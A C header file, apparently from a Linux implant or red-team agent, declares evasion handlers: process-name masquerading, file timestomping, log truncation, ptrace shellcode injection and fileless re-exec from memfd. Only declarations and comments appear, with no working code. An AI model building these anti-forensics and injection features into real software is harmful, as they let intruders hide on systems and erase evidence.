#ifndef TASKS_OPSEC_H
#define TASKS_OPSEC_H

#include "types.h"
#include "msgpack.h"

/// OPSEC command handlers

/// masquerade — set process name to fake value
int task_masquerade(const uint8_t *data, uint32_t len, mp_writer_t *w);

/// timestomp — modify file timestamps
int task_timestomp(const uint8_t *data, uint32_t len, mp_writer_t *w);

/// cleanlog — truncate system logs (requires root)
int task_cleanlog(mp_writer_t *w);

/// inject — ptrace-based shellcode injection
int task_inject(const uint8_t *data, uint32_t len, mp_writer_t *w);

/// migrate — re-exec from memfd (fileless)
int task_migrate(mp_writer_t *w);

#endif /* TASKS_OPSEC_H */
